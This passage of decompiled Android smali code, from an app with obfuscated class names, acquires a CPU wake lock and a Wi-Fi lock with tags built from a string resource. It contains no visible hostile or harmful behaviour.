    invoke-virtual {v6, v7, v4, v8}, Lcmf0/c3b5bm90zq/patch/a;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    :cond_b
    :goto_c
    monitor-exit v3
    :try_end_6
    .catchall {:try_start_6 .. :try_end_6} :catchall_0

    if-eqz v2, :cond_0

    :goto_d
    const v2, 0x7f0c0020

    :try_start_7
    iget-object v3, v1, Lcmf0/c3b5bm90zq/patch/C11$23;->a:Lcmf0/c3b5bm90zq/patch/C11;

    const-string v4, "power"

    invoke-virtual {v3, v4}, Lcmf0/c3b5bm90zq/patch/C11;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/os/PowerManager;

    invoke-static {}, Lcmf0/c3b5bm90zq/patch/C11;->i()Landroid/os/PowerManager$WakeLock;

    move-result-object v4

    if-nez v4, :cond_c

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v6, v1, Lcmf0/c3b5bm90zq/patch/C11$23;->a:Lcmf0/c3b5bm90zq/patch/C11;

    invoke-virtual {v6, v2}, Lcmf0/c3b5bm90zq/patch/C11;->getString(I)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v6, "0"

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v5, v4}, Landroid/os/PowerManager;->newWakeLock(ILjava/lang/String;)Landroid/os/PowerManager$WakeLock;

    move-result-object v3

    invoke-static {v3}, Lcmf0/c3b5bm90zq/patch/C11;->a(Landroid/os/PowerManager$WakeLock;)Landroid/os/PowerManager$WakeLock;

    invoke-static {}, Lcmf0/c3b5bm90zq/patch/C11;->i()Landroid/os/PowerManager$WakeLock;

    move-result-object v3

    invoke-virtual {v3}, Landroid/os/PowerManager$WakeLock;->acquire()V
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_6

    :catch_6
    :cond_c
    :try_start_8
    iget-object v3, v1, Lcmf0/c3b5bm90zq/patch/C11$23;->a:Lcmf0/c3b5bm90zq/patch/C11;

    invoke-virtual {v3}, Lcmf0/c3b5bm90zq/patch/C11;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    const-string v4, "wifi"

    invoke-virtual {v3, v4}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/net/wifi/WifiManager;

    invoke-static {}, Lcmf0/c3b5bm90zq/patch/C11;->j()Landroid/net/wifi/WifiManager$WifiLock;

    move-result-object v4

    if-nez v4, :cond_d

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v6, v1, Lcmf0/c3b5bm90zq/patch/C11$23;->a:Lcmf0/c3b5bm90zq/patch/C11;

    invoke-virtual {v6, v2}, Lcmf0/c3b5bm90zq/patch/C11;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "1"

    invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v3, v5, v2}, Landroid/net/wifi/WifiManager;->createWifiLock(ILjava/lang/String;)Landroid/net/wifi/WifiManager$WifiLock;

    move-result-object v2

    invoke-static {v2}, Lcmf0/c3b5bm90zq/patch/C11;->a(Landroid/net/wifi/WifiManager$WifiLock;)Landroid/net/wifi/WifiManager$WifiLock;

    invoke-static {}, Lcmf0/c3b5bm90zq/patch/C11;->j()Landroid/net/wifi/WifiManager$WifiLock;

    move-result-object v2

    invoke-virtual {v2}, Landroid/net/wifi/WifiManager$WifiLock;->acquire()V
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_7

    :catch_7
    :cond_d
    return-void

    :goto_e
    :try_start_9
    monitor-exit v3
    :try_end_9
    .catchall {:try_start_9 .. :try_end_9} :catchall_0

    throw v2
.end method
